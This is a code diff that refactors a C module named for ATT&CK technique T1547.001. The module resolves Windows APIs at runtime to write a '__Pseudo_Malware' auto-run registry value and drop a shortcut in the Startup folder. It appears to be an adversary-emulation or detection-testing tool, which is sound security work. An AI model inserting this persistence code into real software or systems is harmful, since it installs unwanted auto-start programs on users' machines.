@@ -1,6 +1,7 @@
 #include "T1547.001.h"
 
 #include "../misc/common.h"
+#include "../misc/function_pointers.h"
 #include "../misc/str.h"
 #include "../misc/wstr.h"
 #include "../runtime_linking.h"
@@ -44,8 +45,8 @@ static HKEY create_key(ProcedureList* pAdvapi32, HKEY key, LPCWSTR subkey)
 	HKEY hKey = NULL;
 	DWORD disposition = 0;
 
-	FARPROC PFN_RegCreateKeyExW = *VECTOR_AT(pAdvapi32->procedures, FARPROC, REG_CREATE_KEY_EX_W);
-	LSTATUS status = PFN_RegCreateKeyExW(key,
+	PFN_RegCreateKeyExW reg_create_key_ex_w = *VECTOR_AT(pAdvapi32->procedures, PFN_RegCreateKeyExW, REG_CREATE_KEY_EX_W);
+	LSTATUS status = reg_create_key_ex_w(key,
 									 subkey,
 									 0,
 									 NULL,
@@ -77,14 +78,16 @@ static String to_base64(ProcedureList* pCrypt32, const char* string)
 {
 	size_t len = strlen(string);
 	DWORD size = 0;
-	FARPROC PFN_CryptBinaryToStringA = *VECTOR_AT(pCrypt32->procedures, FARPROC, CRYPT_BINARY_TO_STRING_A);
-	if (!PFN_CryptBinaryToStringA(string, (DWORD) len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size))
+	PFN_CryptBinaryToStringA crypt_binary_to_string_a = *VECTOR_AT(pCrypt32->procedures, 
+																   PFN_CryptBinaryToStringA, 
+																   CRYPT_BINARY_TO_STRING_A);
+	if (!crypt_binary_to_string_a(string, (DWORD) len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size))
 	{
 		return (String) { 0 };
 	}
 
 	Vector buffer = VECTOR_CREATE(char, size);
-	BOOL b = PFN_CryptBinaryToStringA(string, (DWORD) len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, buffer.pData, &size);
+	BOOL b = crypt_binary_to_string_a(string, (DWORD) len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, buffer.pData, &size);
 	if (*VECTOR_BACK(buffer, char) != '\0')
 	{
 		char terminator = '\0';
@@ -108,8 +111,8 @@ static void set_auto_run_value(ProcedureList* pAdvapi32, ProcedureList* pCrypt32
 	}
 
 
-	FARPROC PFN_RegSetValueExA = *VECTOR_AT(pAdvapi32->procedures, FARPROC, REG_SET_VALUE_EX_A);
-	if (PFN_RegSetValueExA(hKey, 
+	PFN_RegSetValueExA reg_set_value_ex_a = *VECTOR_AT(pAdvapi32->procedures, PFN_RegSetValueExA, REG_SET_VALUE_EX_A);
+	if (reg_set_value_ex_a(hKey,
 						   "__Pseudo_Malware", 
 						   0, 
 						   REG_SZ,
@@ -119,8 +122,8 @@ static void set_auto_run_value(ProcedureList* pAdvapi32, ProcedureList* pCrypt32
 		assert(FALSE);
 	}
 
-	FARPROC PFN_RegCloseKey = *VECTOR_AT(pAdvapi32->procedures, FARPROC, REG_CLOSE_KEY);
-	if (PFN_RegCloseKey(hKey) != ERROR_SUCCESS)
+	PFN_RegCloseKey reg_close_key = *VECTOR_AT(pAdvapi32->procedures, PFN_RegCloseKey, REG_CLOSE_KEY);
+	if (reg_close_key(hKey) != ERROR_SUCCESS)
 	{
 		assert(FALSE);
 	}
@@ -142,8 +145,10 @@ static WideString to_wide_string(ProcedureList* pKernel32, const char* str)
 	assert(str != NULL);
 
 	WCHAR tmp[2048] = { 0 };
-	FARPROC PFN_MultiByteToWideChar = *VECTOR_AT(pKernel32->procedures, FARPROC, MULTI_BYTE_TO_WIDE_CHAR);
-	int32_t written = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, str, -1, tmp, ARRAYSIZE(tmp));
+	PFN_MultiByteToWideChar multi_byte_to_wide_char = *VECTOR_AT(pKernel32->procedures, 
+																 PFN_MultiByteToWideChar, 
+																 MULTI_BYTE_TO_WIDE_CHAR);
+	int32_t written = multi_byte_to_wide_char(CP_UTF8, MB_ERR_INVALID_CHARS, str, -1, tmp, ARRAYSIZE(tmp));
 	if (written == 0)
 	{
 		PRINT_WIN32_ERROR(MultiByteToWideChar);
@@ -191,8 +196,8 @@ static WideString append_filename(LPCWSTR target, LPCWSTR lnkPath)
 }
 static BOOL init_com(ProcedureList* pOle32)
 {
-	FARPROC PFN_CoInitializeEx = *VECTOR_AT(pOle32->procedures, FARPROC, CO_INITIALIZE_EX);
-	HRESULT res = PFN_CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+	PFN_CoInitializeEx co_initialize_ex = *VECTOR_AT(pOle32->procedures, PFN_CoInitializeEx, CO_INITIALIZE_EX);
+	HRESULT res = co_initialize_ex(NULL, COINIT_APARTMENTTHREADED);
 	if (!SUCCEEDED(res))
 	{
 		printf("CoInitializeEx failed with code: 0x%08lX\n", res);
@@ -210,8 +215,8 @@ static void store_lnk_file(ProcedureList* pOle32, LPCWSTR target, LPCWSTR lnkPat
 	}
 
 	IShellLinkW* pLink = NULL;
-	FARPROC PFN_CoCreateInstance = *VECTOR_AT(pOle32->procedures, FARPROC, CO_CREATE_INSTANCE);
-	HRESULT res = PFN_CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (void**) (&pLink));
+	PFN_CoCreateInstance co_create_instance = *VECTOR_AT(pOle32->procedures, PFN_CoCreateInstance, CO_CREATE_INSTANCE);
+	HRESULT res = co_create_instance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (void**) (&pLink));
 	if (SUCCEEDED(res))
 	{
 		assert(pLink != NULL);
@@ -249,14 +254,14 @@ static void store_lnk_file(ProcedureList* pOle32, LPCWSTR target, LPCWSTR lnkPat
 	}
 
 
-	FARPROC PFN_CoUninitialize = *VECTOR_AT(pOle32->procedures, FARPROC, CO_UNINITIALIZE);
-	PFN_CoUninitialize();
+	PFN_CoUninitialize co_uninitialize = *VECTOR_AT(pOle32->procedures, PFN_CoUninitialize, CO_UNINITIALIZE);
+	co_uninitialize();
 }
 static void add_lnk_to_startup_dir(ProcedureList* pKernel32, ProcedureList* pShell32, ProcedureList* pOle32, char** argv)
 {
 	PWSTR startupFolder = NULL;
-	FARPROC PFN_SHGetKnownFolderPath = *VECTOR_AT(pShell32->procedures, FARPROC, SH_GET_KNOWN_FOLDER_PATH);
-	HRESULT res = SHGetKnownFolderPath(&FOLDERID_Startup, 0, NULL, &startupFolder);
+	PFN_SHGetKnownFolderPath sh_get_known_folder_path = *VECTOR_AT(pShell32->procedures, PFN_SHGetKnownFolderPath, SH_GET_KNOWN_FOLDER_PATH);
+	HRESULT res = sh_get_known_folder_path(&FOLDERID_Startup, 0, NULL, &startupFolder);
 	if (res != S_OK)
 	{
 		printf("SHGetKnownFolderPath failed with code: 0x%08lX\n", res);
@@ -279,8 +284,8 @@ static void add_lnk_to_startup_dir(ProcedureList* pKernel32, ProcedureList* pShe
 		WSTRING_DESTROY(lnkLocation);
 	}
 
-	FARPROC PFN_CoTaskMemFree = *VECTOR_AT(pOle32->procedures, FARPROC, CO_TASK_MEM_FREE);
-	PFN_CoTaskMemFree(startupFolder);
+	PFN_CoTaskMemFree co_task_mem_free = *VECTOR_AT(pOle32->procedures, PFN_CoTaskMemFree, CO_TASK_MEM_FREE);
+	co_task_mem_free(startupFolder);
 }
 //
 //
